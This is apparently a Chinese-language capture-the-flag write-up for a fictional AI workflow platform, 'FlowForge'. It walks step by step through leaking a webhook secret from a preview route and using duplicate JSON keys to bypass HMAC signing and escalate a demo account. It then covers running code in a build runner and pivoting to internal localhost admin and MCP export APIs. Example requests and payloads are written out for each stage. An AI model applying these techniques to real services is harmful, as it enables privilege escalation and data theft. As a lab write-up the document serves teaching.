# FlowForge CTF - 解题思路

## 题目简述

FlowForge 是一个 AI 工作流托管平台，公开入口只有 Web 端口 `80`，已知低权限账号为 `demo / demo123`。目标不是拿 admin 密码，而是导出私有工作流 `admin-secret` 的最终 secret bundle；该 bundle 不能通过普通 RCE 直接读文件获取，必须从 runner 视角访问内网 Admin API。

关键链路是：登录 demo 后从 `demo-workflow` 日志进入 support incident，拿到源码附件和 preview 线索；利用 webhook 签名和业务解析对 JSON 重复 key 的不同视角，把 demo 提升为 maintainer；再导入自定义 MCP processor node 并触发 build，让 runner 作为 localhost 跳板访问内部 GraphQL/API，最终导出 admin secret bundle。

## 解题过程

### Stage 0: 从 demo-workflow 日志拿到 support incident

登录 `demo` 后访问公开工作流 `demo-workflow`，其日志会提示一个 support incident：

```http
GET /workflows/demo-workflow
```

日志里会出现类似：

```text
/support/incidents/FL0WF0RG3-SG2026-PR3V13W-C0MP47
```

访问该工单页后，可以看到 artifact ref，并下载部分源码附件。

### Stage 1: 附件分析 + workflow index + preview 泄露

附件里会给出一段 preview 路由代码，表明存在：

```http
GET /workflows/:id/preview.js
```

登录后访问控制台，`/api/workflows` 会返回工作流索引，能够确认私有工作流 `admin-secret` 存在：

```http
GET /api/workflows
```

随后访问：

```http
GET /workflows/admin-secret/preview.js
```

该兼容性 preview 会返回 `webhook_secret` 和 `webhook_endpoint`。附件源码里已经能看到 `firstKeyJsonParse(...)`，这就是后面重复 key 利用的关键线索。

### Stage 2: JSON 重复键与 HMAC 解析差异

Webhook 签名使用 `firstKeyJsonParse` 的结果计算 HMAC，业务逻辑使用 `JSON.parse`。构造重复 `event`：

```json
{ "event": "workflow.ping", "event": "workflow.promote", "target": "demo" }
```

签名时使用 first-key 视角：

```json
{ "event": "workflow.ping", "target": "demo" }
```

服务端会根据当前会话角色限制兼容签名视角：非管理员只允许第一个 `event` 是 `workflow.ping`。因此以 `demo` 会话直接发送：

```json
{ "event": "workflow.promote", "target": "demo" }
```

即使签名正确，也会被拒绝。

请求：

```http
POST /webhooks/admin-secret
Content-Type: application/json
X-FlowForge-Signature: sha256=<hmac>

{"event":"workflow.ping","event":"workflow.promote","target":"demo"}
```

成功后 `demo` 被提升为 `maintainer`，响应和日志里会给出 `runner_token`。

### Stage 3: demo 升成 maintainer 后怎么继续

`demo` 被提升成 `maintainer` 后，真正有价值的是可以访问这两个接口：

```http
POST /api/nodes/import
POST /api/builds/trigger
```

正确思路可以拆成三步：

1. `POST /api/nodes/import` 导入一个自定义 community MCP processor node  
   这里的 `config.script` 会被带到 worker 子进程里执行。

2. `POST /api/builds/trigger` 触发这个 node  
   构建过程会启动一个低权限 runner 子进程，并把一些关键环境变量带进去，比如：
   - `RUNNER_TOKEN`
   - `RUNNER_SESSION_PATH`
   - `ADMIN_API_HINT`
   - `MCP_INSPECTOR_HINT`

3. 把这个 runner 当成 localhost 内网跳板  
   不是直接读 `/srv/flowforge/admin_secret_bundle.json`，因为那里只会返回 sealed manifest；正确做法是让 runner 代码去请求 `127.0.0.1` 上的内部服务。

### Stage 4: runner 用 GraphQL 拿 export ticket

向内部 Admin API 发 GraphQL：

```graphql
query {
  debugExport(flowId: "admin-secret") {
    workflowId
    status
    exportToken
    mcpEndpoint
    hint
  }
}
```

请求头：

```http
X-Internal-Token: <runner_token>
```

响应会返回一次性的 `exportToken`。

这里的关键点是：  
`maintainer` 身份只负责让你获得 runner 代码执行能力；真正导出 flag 的授权，来自 runner 环境里的 `RUNNER_TOKEN`。

### Stage 5: runner 用 export ticket 请求 MCP inspector

使用 GraphQL 返回的 ticket 访问：

```http
POST http://127.0.0.1:9100/debug/export_secret_bundle
Content-Type: application/json
X-MCP-Export-Token: <exportToken>

{"workflow_id":"admin-secret"}
```

成功响应包含最终 bundle，flag 在：

```json
{
  "status": "ok",
  "bundle.bundle.flag"
}
```

### 完整链路

1. 登录 `demo / demo123`
2. 在 `demo-workflow` 日志中拿到 support incident，进入工单页获取附件
3. 通过附件分析出 `/workflows/:id/preview.js`，再用 `/api/workflows` 确认 `admin-secret`
4. 读取 preview 泄露的 `webhook_secret`
5. 用重复 JSON key 绕过 HMAC 语义，触发 `workflow.promote`
6. 以 `maintainer` 身份导入一个自定义 MCP processor node
7. 触发 build，在 runner 子进程中执行自定义 Node.js 脚本
8. 用 runner 环境里的 `RUNNER_TOKEN` 请求内网 Admin GraphQL，拿到 export ticket
9. 用 export ticket 请求 MCP inspector，导出最终 bundle



## 方法总结

- 核心技巧：利用 JSON 重复键造成签名视角和业务解析视角不一致，再通过 runner 视角访问内网导出接口。
- 识别信号：题目出现 webhook 签名、兼容解析函数、runner token、内网 inspector/API 时，应重点检查签名材料泄露、解析差异和身份上下文切换。
- 复用要点：RCE 只是进入 runner 环境的一步，最终敏感数据往往还需要用内部 token 或一次性 ticket 按业务链路导出。
